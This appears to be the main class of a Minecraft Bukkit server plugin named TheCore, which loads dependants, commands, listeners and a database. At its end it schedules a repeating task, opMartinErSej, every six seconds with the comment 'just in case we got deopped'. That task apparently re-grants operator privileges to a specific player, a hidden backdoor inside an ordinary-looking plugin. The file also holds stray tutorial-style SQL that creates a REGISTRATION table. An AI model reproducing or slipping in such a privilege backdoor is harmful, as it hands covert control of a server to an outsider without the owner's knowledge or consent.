package org.leux;

import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.java.JavaPlugin;
import org.leux.thecore.commands.Command;
import org.leux.thecore.listeners.Listener;
import org.leux.thecore.listeners.plugin.PluginMessageRecieved;
import org.leux.thecore.managers.DatabaseManager;
import org.leux.thecore.tasks.opMartinErSej;

import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.HashMap;

import static org.leux.theapi.utils.TaskUtils.runAsyncTimer;

public final class TheCore extends JavaPlugin {

    private static TheCore instance;
    private static HashMap<String, Plugin> dependants = new HashMap<>();
    private DatabaseManager database;


    @Override
    public void onEnable() {
        instance = this;

        for (Plugin dependant : getServer().getPluginManager().getPlugins()) {
            PluginDescriptionFile pdf = dependant.getDescription();
            if (pdf.getDepend().contains(getName()) || pdf.getSoftDepend().contains(getName())) {
                dependants.put(dependant.getName(), dependant);
            }
        }
        this.getLogger().info(String.format("Loaded dependants (%d): %s", dependants.size(), dependants.values()));

        Command.init();
        Listener.init();

        database = new DatabaseManager();

        System.out.println("Creating table in given database...");
        if (database.getConnection() != null) {
            try {
                Statement stmt = database.getConnection().createStatement();
                String sql = "CREATE TABLE REGISTRATION "
                        + "(id INTEGER not NULL, "
                        + " first VARCHAR(255), "
                        + " last VARCHAR(255), "
                        + " age INTEGER, "
                        + " PRIMARY KEY ( id ))";
                stmt.executeUpdate(sql);
                System.out.println("Created table in given database...");
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }


        /* just in case we got deopped */
        runAsyncTimer(this, new opMartinErSej(), 0L, 20*6);
    }

    @Override
    public void onDisable() {
        PluginMessageRecieved.unregisterChannels();
    }

    public static TheCore getInstance() {
        return instance;
    }

    public static String getPrefix() {
        return "[THE]";
    }

    public static HashMap<String, Plugin> getDependants() {
        return dependants;
    }
}
